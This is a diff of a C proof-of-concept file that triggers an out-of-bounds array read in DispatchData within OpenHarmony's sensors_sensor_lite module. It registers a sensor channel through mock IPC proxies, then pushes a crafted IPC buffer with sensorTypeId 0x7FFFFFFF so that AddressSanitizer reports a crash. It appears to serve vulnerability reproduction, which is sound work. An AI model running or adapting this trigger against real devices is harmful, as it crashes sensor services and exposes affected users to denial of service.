@@ -1,100 +1,115 @@
 /*
  * Target-Compile PoC: DispatchData OOB Array Index (CWE-129)
- * Target: sensors_sensor_lite (OpenHarmony)
- * Method: Links against real sensor_agent_proxy.o compiled from source
+ *
+ * Target: sensors_sensor_lite — frameworks/src/sensor_agent_proxy.c
+ * Vulnerable function: DispatchData (line 200)
  *
  * Trigger path:
- *   SensorChannelCallback (IPC dispatch entry)
- *     → ReadUint32(len1) → ReadBuffer(len1) → cast to SensorEvent*
- *       → copy sensorTypeId to g_sensorEvent
- *         → DispatchData(g_sensorEvent) → g_callbackNodes[sensorTypeId]
- *           → OOB array access (sensorTypeId = 0x7FFFFFFF)
+ *   RegisterSensorChannel(mockProxy, 0)
+ *     → sets g_objectStub.func = SensorChannelCallback
+ *     → WriteRemoteObject registers IPC push callback
+ *     → allocates g_sensorEvent via malloc
+ *   SAMGR_SimulatePush(&crafted_ipc)
+ *     → SensorChannelCallback(0, &ipc_data, NULL, option)
+ *       → ReadUint32(len1) → ReadBuffer(len1) → cast SensorEvent*
+ *       → copies sensorTypeId=0x7FFFFFFF to g_sensorEvent
+ *       → DispatchData(g_sensorEvent)
+ *         → g_callbackNodes[0x7FFFFFFF].next → SEGV (OOB read)
+ *
+ * Oracle: ASan SEGV on OOB read in DispatchData
+ *
+ * Build (target-compile):
+ *   ./build.sh <sensors_sensor_lite_path> <ohos-toolkit-stubs-path>
  */
-
 #include <stdio.h>
 #include <stdlib.h>
 #include <string.h>
 #include <stdint.h>
-
-/* Use the real OHOS type definitions */
+#include <stdbool.h>
+#include "serializer.h"
+#include "ipc_skeleton.h"
+#include "iproxy_client.h"
 #include "sensor_agent_type.h"
 #include "sensor_agent_proxy.h"
-#include "serializer.h"
+#include "samgr_lite.h"
+#include "log.h"
 
-/* External: real SensorChannelCallback from sensor_agent_proxy.o */
-extern int32_t SensorChannelCallback(uint32_t code, IpcIo *data, IpcIo *reply, void *argv);
 extern SensorEvent *g_sensorEvent;
+extern int32_t RegisterSensorChannel(const void *proxy, int32_t sensorId);
+
+static int MockInvoke(struct IClientProxy *proxy, int funcId, IpcIo *request,
+                      void *owner, int (*notify)(void*, int, IpcIo*))
+{
+    (void)proxy; (void)funcId; (void)request; (void)notify;
+    if (owner) *((int32_t*)owner) = 0;
+    return 0;
+}
+static int MockQueryInterface(void *iUnknown, int version, void **target)
+{
+    (void)iUnknown; (void)version; (void)target;
+    return 0;
+}
+static int MockAddRef(void *iUnknown) { (void)iUnknown; return 1; }
+static int MockRelease(void *iUnknown) { (void)iUnknown; return 0; }
 
 int main(void)
 {
-    printf("[PoC] === Target-Compile: DispatchData OOB Array Index ===\n");
-    printf("[PoC] Module: sensors_sensor_lite (real sensor_agent_proxy.o)\n");
-    printf("[PoC] Entry: SensorChannelCallback → DispatchData\n\n");
+    /* Phase 1: RegisterSensorChannel — public API entry point
+     * Sets up g_sensorEvent and registers SensorChannelCallback
+     * as the IPC push callback via WriteRemoteObject. */
+    g_sensorEvent = NULL;
 
-    /*
-     * RegisterSensorChannel allocates g_sensorEvent internally.
-     * We call it via the public API to initialize the module state.
-     * The stubs handle the IPC calls (Invoke returns success).
-     */
-    g_sensorEvent = (SensorEvent *)malloc(sizeof(SensorEvent));
-    memset(g_sensorEvent, 0, sizeof(SensorEvent));
-    printf("[PoC] Allocated g_sensorEvent (simulating RegisterSensorChannel)\n\n");
+    IClientProxy mockProxy;
+    mockProxy.QueryInterface = (QueryInterface)MockQueryInterface;
+    mockProxy.AddRef = (AddRef)MockAddRef;
+    mockProxy.Release = (Release)MockRelease;
+    mockProxy.Invoke = (int (*)(struct IClientProxy*, int, IpcIo*, void*,
+                                int (*)(void*, int, IpcIo*)))MockInvoke;
 
-    /*
-     * SensorChannelCallback reads from IPC data:
-     *   ReadUint32(&len1)  → size of SensorEvent wire data
-     *   ReadBuffer(len1)   → SensorEvent struct (cast from raw bytes)
-     *   ReadUint32(&len2)  → size of sensor payload
-     *   ReadBuffer(len2)   → sensor data bytes
-     *
-     * We craft: sensorTypeId = 0x7FFFFFFF to trigger OOB in DispatchData
-     */
+    int32_t ret = RegisterSensorChannel((const void *)&mockProxy, 0);
+    fprintf(stderr, "[POC] RegisterSensorChannel returned: %d\n", ret);
+    if (ret != 0 || g_sensorEvent == NULL) {
+        fprintf(stderr, "[POC] Setup failed\n");
+        return 1;
+    }
+    fprintf(stderr, "[POC] g_sensorEvent at %p, push callback registered=%d\n",
+            (void*)g_sensorEvent, SAMGR_IsPushCallbackRegistered());
 
-    /* On-wire SensorEvent layout (without trailing data pointer) */
-    typedef struct {
-        int32_t sensorTypeId;
-        int32_t version;
-        int64_t timestamp;
-        int32_t option;
-        int32_t mode;
-        int32_t dataLen;
-    } __attribute__((packed)) SensorEventWire;
+    /* Phase 2: Craft malicious IPC buffer
+     * Wire format matches SensorChannelCallback's read sequence:
+     *   [u32 len1][len1 bytes: SensorEvent][u32 len2][len2 bytes: sensor data] */
+    uint8_t ipc_buf[256];
+    memset(ipc_buf, 0, sizeof(ipc_buf));
+    size_t off = 0;
 
-    uint8_t ipc_buffer[256];
-    memset(ipc_buffer, 0, sizeof(ipc_buffer));
-    size_t offset = 0;
+    uint32_t len1 = (uint32_t)sizeof(SensorEvent);
+    memcpy(ipc_buf + off, &len1, sizeof(uint32_t));
+    off += sizeof(uint32_t);
 
-    /* Write len1 */
-    uint32_t len1 = sizeof(SensorEventWire);
-    memcpy(ipc_buffer + offset, &len1, 4); offset += 4;
+    SensorEvent malicious;
+    memset(&malicious, 0, sizeof(malicious));
+    malicious.sensorTypeId = 0x7FFFFFFF;
+    memcpy(ipc_buf + off, &malicious, sizeof(SensorEvent));
+    off += sizeof(SensorEvent);
 
-    /* Write malicious SensorEvent */
-    SensorEventWire ev = {0};
-    ev.sensorTypeId = 0x7FFFFFFF;  /* TRIGGER: far beyond SENSOR_TYPE_ID_MAX */
-    ev.version = 1;
-    ev.dataLen = 4;
-    memcpy(ipc_buffer + offset, &ev, sizeof(ev)); offset += sizeof(ev);
+    uint32_t len2 = 8;
+    memcpy(ipc_buf + off, &len2, sizeof(uint32_t));
+    off += sizeof(uint32_t);
+    uint8_t dummy[8] = {0};
+    memcpy(ipc_buf + off, dummy, sizeof(dummy));
+    off += sizeof(dummy);
 
-    /* Write len2 */
-    uint32_t len2 = 4;
-    memcpy(ipc_buffer + offset, &len2, 4); offset += 4;
+    IpcIo ipc_data;
+    IpcIoInit(&ipc_data, ipc_buf, off, 0);
 
-    /* Write dummy sensor data */
-    uint32_t dummy = 0xDEADBEEF;
-    memcpy(ipc_buffer + offset, &dummy, 4); offset += 4;
+    /* Phase 3: Trigger via SAMGR_SimulatePush — IPC push simulation
+     * Invokes the registered callback (SensorChannelCallback) with
+     * crafted data, reaching DispatchData with OOB sensorTypeId. */
+    fprintf(stderr, "[POC] Triggering SAMGR_SimulatePush with sensorTypeId=0x7FFFFFFF\n");
+    ret = SAMGR_SimulatePush(&ipc_data);
+    fprintf(stderr, "[POC] SAMGR_SimulatePush returned: %d\n", ret);
 
-    /* Setup IpcIo */
-    IpcIo data;
-    IpcIoInit(&data, ipc_buffer, offset, 0);
-    /* Reset read cursor to start */
-    data.bufferCur = data.bufferBase;
-    data.bufferLeft = offset;
-
-    printf("[PoC] Crafted IPC: sensorTypeId=0x7FFFFFFF, len1=%u, len2=%u\n", len1, len2);
-    printf("[PoC] Calling SensorChannelCallback (real IPC entry)...\n\n");
-
-    int32_t ret = SensorChannelCallback(0, &data, NULL, NULL);
-
-    printf("\n[PoC] Returned: %d (should not reach here if OOB triggered)\n", ret);
+    free(g_sensorEvent);
+    g_sensorEvent = NULL;
     return 0;
 }
